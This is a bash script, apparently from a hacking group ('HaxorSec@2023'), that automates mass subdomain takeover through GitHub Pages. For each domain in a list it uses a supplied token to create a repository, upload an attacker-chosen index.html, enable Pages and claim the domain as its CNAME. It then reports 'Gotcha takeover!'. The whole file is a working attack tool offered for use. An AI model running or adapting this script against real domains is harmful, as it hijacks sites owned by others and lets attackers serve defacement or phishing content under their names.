#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'


echo -e "$yellow ===================================================="
echo -e "$okegreen            Mass AutoTakeover Github               "
echo -e "$okegreen              HaxorSec@2023                  "
echo -e "$yellow ===================================================="
read -p "Your List: " list;
read -p "Your username: " user;
read -p "Your Key: " key;
read -p "Your Index: " index;

for domen in $(cat $list);do 
if [[ $(curl -s -L -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${key}" https://api.github.com/user/repos -d '{"name":"'${domen}'","description":"Takeover Digiproject","homepage":"https://github.com","private":false,"has_issues":true,"has_projects":true,"has_wiki":true}') =~ "$user" ]];
then
  echo -e "$cyan[*]$okegreen Creating repository $domen Successfull.."
  ubah=$(cat $index | base64)
  if [[ $(curl -s -XPUT -L -H 'Content-Type: application/json' -H "Authorization: Bearer ${key}" https://api.github.com/repos/${user}/${domen}/contents/index.html -d '{ "message": "TakeOver Index","content": "'$ubah'"}') =~ "content" ]];
  then
     echo -e "$cyan[*]$okegreen Upload Files Successfull.."
     if [[ $(curl -s -XPOST -L -H 'Content-Type: application/json' -H "Authorization: Bearer ${key}" https://api.github.com/repos/${user}/${domen}/pages -d '{"source":{"branch":"main","path":"/"}}') =~ "http" ]];
     then
          echo -e "$cyan[*]$okegreen Turn On Pages Successfull.."
          if [[ $(curl -s -XPUT -L -H 'Content-Type: application/json' -H "Authorization: Bearer ${key}" https://api.github.com/repos/${user}/${domen}/pages -d '{"cname":"'${domen}'","source":{"branch":"main","path":"/"}}') =~ "Already" ]];
          then
             echo -e "$cyan[*]$red $domen Already exist :(.."
           else
                 echo -e "$cyan[*]$okegreen $domen => Gotcha takeover!"
            fi
     else
         echo -e "$cyan[*]$red Failed Turn on Page, Try manual :("
      fi
    else
      echo -e "$cyan[*]$red Upload Files Failed, try manual"
    fi
else
  echo -e "$cyan[*]$red Aww, snap ada kesalahan konfigurasi tuh"
fi
done    
       
